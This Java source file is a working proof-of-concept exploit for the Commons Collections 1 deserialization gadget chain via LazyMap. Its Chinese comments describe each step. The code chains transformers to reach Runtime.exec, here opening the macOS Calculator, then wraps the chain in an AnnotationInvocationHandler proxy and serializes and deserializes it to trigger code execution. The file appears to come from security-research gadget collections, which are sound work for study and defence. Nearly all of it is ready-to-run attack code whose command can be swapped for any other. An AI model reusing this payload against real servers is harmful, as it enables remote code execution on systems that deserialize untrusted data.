package com.sec.exploits.CommonsCollections.CommonsCollections1;

import com.sec.annotation.Dependencies;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

/**
 * @program: Gadgets
 * @description:
 * @author: 0range
 * @create: 2021-05-11 15:21
 **/

/**
 * Gadget Chain :
*         ObjectInputStream.readObject()
*             AnnotationInvocationHandler.readObject()
*                 Map(Proxy).entrySet()
*                     AnnotationInvocationHandler.invoke()
*                         LazyMap.get()
*                             ChainedTransformer.transform()
*                                 ConstantTransformer.transform()
*                                 InvokerTransformer.transform()
*                                     Method.invoke()
*                                         Class.getMethod()
*                                 InvokerTransformer.transform()
*                                     Method.invoke()
*                                         Runtime.getRuntime()
*                                 InvokerTransformer.transform()
*                                     Method.invoke()
*                                         Runtime.exec()
 */

@Dependencies({
        "commons-collections:commons-collections:3.1-3.2.1",
        "jdk1.7"
})
public class LazyMap_Exploit {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers_exec = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /Applications/Calculator.app"})
        };

        Transformer chain = new ChainedTransformer(transformers_exec);

        HashMap innerMap = new HashMap();
        innerMap.put("value","abcd");

        Map lazyMap = LazyMap.decorate(innerMap,chain);
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);
        cons.setAccessible(true);

        // 创建携带着LazyMap的AnnotationInvocationHandler实例h1
        InvocationHandler h1 = (InvocationHandler) cons.newInstance(Target.class,lazyMap);
        // 创建LazyMap的动态代理类实例
        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(), h1);

        // 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues
        InvocationHandler h2 = (InvocationHandler)cons.newInstance(Target.class, mapProxy);

        //payload序列化写入文件，模拟网络传输
        ObjectOutputStream fout = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty("user.dir")+"/src/main/resources/Payload_cc1_LazyMap.ser")));
        fout.writeObject(h2);

        //2.服务端读取文件，反序列化，模拟网络传输
        ObjectInputStream fin = new ObjectInputStream(new FileInputStream(new File(System.getProperty("user.dir")+"/src/main/resources/Payload_cc1_LazyMap.ser")));
        //服务端反序列化，触发漏洞
        fin.readObject();
    }
}
